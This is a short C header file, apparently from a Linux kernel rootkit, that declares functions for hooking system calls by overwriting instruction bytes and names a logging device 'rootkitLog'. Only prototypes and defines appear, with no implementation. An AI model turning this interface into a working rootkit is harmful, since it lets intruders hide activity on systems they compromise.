#include "messagesToUser.h"

// Needed if you intend to be able to unload/reload the module without rebooting
#define DEV_MODE

// Dev name as it appears in /proc/devices  
#define DEVICE_NAME "rootkitLog" 

#define NUM_HIJACK_BYTES   6

void *hookSyscall(unsigned int syscallNumber, void *hook);

void getHijackBytes(void *hijackDestination, /* out */ char *bytes);

// void writeHijackBytes(void *address, char *replacementBytes);

void writeHijackBytes(void *original, char *replacementBytes, /* out */ char *previousBytes);
